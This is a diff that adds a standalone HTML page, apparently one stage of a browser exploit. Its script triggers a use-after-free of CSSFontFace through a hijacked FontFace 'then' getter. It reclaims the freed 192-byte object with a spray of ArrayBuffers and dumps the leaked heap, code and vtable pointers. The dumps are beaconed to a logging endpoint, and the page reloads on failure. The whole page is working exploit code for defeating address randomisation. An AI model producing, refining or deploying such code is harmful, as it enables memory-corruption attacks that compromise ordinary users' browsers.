@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P832: CSSFontFace Full 192B Dump (vtable + all pointers)</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P832: CSSFontFace full 192B dump — hunting vtable + code pointers</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P832-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+
+bn('BOOT','start');
+
+/* ===== FontFace UAF with FULL 192B dump ===== */
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs=[],ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    if(st){st.remove();st.textContent='';st=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    fabs=[];
+    for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bb1');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  /* Find the AB that reclaimed CSSFontFace (most non-zero bytes) */
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<fabs.length;i++){
+    var u=new Uint8Array(fabs[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+  if(bestI<0||bestNz<4){
+    bn('MISS','nz='+bestNz);
+    setTimeout(function(){location.reload();},300);
+    return;
+  }
+
+  bn('RECLAIM','idx='+bestI+'|nz='+bestNz);
+  log('Reclaimed AB['+bestI+'] with '+bestNz+' nonzero bytes','ok');
+
+  /* ===== Read ALL 24 qwords using BigUint64Array ===== */
+  var bu=new BigUint64Array(fabs[bestI]);
+  var allQwords=[];
+  var heapPtrs=[];
+  var codePtrs=[];
+  var otherNz=[];
+
+  for(var q=0;q<24;q++){
+    var val=bu[q];
+    var hex='0x'+val.toString(16).padStart(16,'0');
+    var off='+0x'+(q*8).toString(16).padStart(2,'0');
+    allQwords.push(off+'='+hex);
+
+    if(val===0n)continue;
+
+    var hi=Number(val>>32n);
+    var lo=Number(val&0xFFFFFFFFn);
+
+    /* Classify the pointer */
+    if(hi>=0x100&&hi<0x800){
+      /* Heap range: 0x100xxxxxxxx - 0x7FFxxxxxxxx */
+      heapPtrs.push({off:q*8,hex:hex,hi:hi,lo:lo});
+    } else if(hi>=0x800&&hi<0x10000){
+      /* Possible code/library range */
+      codePtrs.push({off:q*8,hex:hex,hi:hi,lo:lo});
+    } else if(hi>0&&hi<0x100){
+      /* Low range — small pointers or counters */
+      otherNz.push({off:q*8,hex:hex,hi:hi,lo:lo});
+    } else if(val!==0n&&hi>=0x10000){
+      /* High range — might be kernel or invalid */
+      codePtrs.push({off:q*8,hex:hex,hi:hi,lo:lo});
+    } else if(val!==0n){
+      otherNz.push({off:q*8,hex:hex,hi:hi,lo:lo});
+    }
+  }
+
+  /* Beacon the full dump in chunks (beacon data limit ~900 chars) */
+  var chunk1=allQwords.slice(0,8).join('|');
+  var chunk2=allQwords.slice(8,16).join('|');
+  var chunk3=allQwords.slice(16,24).join('|');
+  bn('DUMP1',chunk1);
+  bn('DUMP2',chunk2);
+  bn('DUMP3',chunk3);
+
+  /* Log full dump */
+  log('--- CSSFontFace 192B full dump ---','info');
+  for(var q=0;q<24;q++){
+    var val=bu[q];
+    var off='+0x'+(q*8).toString(16).padStart(2,'0');
+    var hex='0x'+val.toString(16).padStart(16,'0');
+    var tag='';
+    if(q===0)tag=' <-- vtable?';
+    if(q*8===0x58)tag=' <-- q11 (known heap ptr)';
+    var cls=val===0n?'':'ok';
+    if(Number(val>>32n)>=0x800)cls='hot';
+    log(off+': '+hex+tag,cls);
+  }
+
+  /* Summary */
+  log('','');
+  log('Heap pointers (0x100-0x7FF range): '+heapPtrs.length,'info');
+  for(var p=0;p<heapPtrs.length;p++){
+    log('  +0x'+heapPtrs[p].off.toString(16)+': '+heapPtrs[p].hex,'ok');
+  }
+
+  log('Code/lib pointers (>=0x800): '+codePtrs.length,'info');
+  for(var p=0;p<codePtrs.length;p++){
+    log('  +0x'+codePtrs[p].off.toString(16)+': '+codePtrs[p].hex,'hot');
+  }
+
+  log('Other nonzero: '+otherNz.length,'info');
+  for(var p=0;p<otherNz.length;p++){
+    log('  +0x'+otherNz[p].off.toString(16)+': '+otherNz[p].hex,'info');
+  }
+
+  /* Compute H from q11 as before for reference */
+  var q11=bu[11]; /* offset 0x58 */
+  var q11lo=Number(q11&0xFFFFFFFFn);
+  var q11hi=Number(q11>>32n);
+  var borrow=(q11lo<0x68)?1:0;
+  var H_hi=q11hi-borrow, H_lo=(q11lo-0x68)>>>0;
+  var Hstr='0x'+H_hi.toString(16)+('00000000'+H_lo.toString(16)).slice(-8);
+  log('','');
+  log('H (from q11) = '+Hstr,'ok');
+
+  /* Also check q0 specifically — is it a vtable? */
+  var q0=bu[0];
+  var q0hi=Number(q0>>32n);
+  var vtableStr='0x'+q0.toString(16).padStart(16,'0');
+  var vtableClass='none';
+  if(q0===0n){vtableClass='zero';}
+  else if(q0hi>=0x100&&q0hi<0x800){vtableClass='heap';}
+  else if(q0hi>=0x800){vtableClass='CODE!';}
+  else{vtableClass='small';}
+  log('q0 (vtable candidate): '+vtableStr+' ['+vtableClass+']','hot');
+
+  /* Beacon summary */
+  var summary='nz='+bestNz+'|heap='+heapPtrs.length+'|code='+codePtrs.length;
+  summary+='|q0='+vtableStr+'|q0class='+vtableClass;
+  summary+='|H='+Hstr;
+  bn('DONE',summary);
+  log('','');
+  log('P832 COMPLETE','hot');
+
+},600);
+</script></body></html>
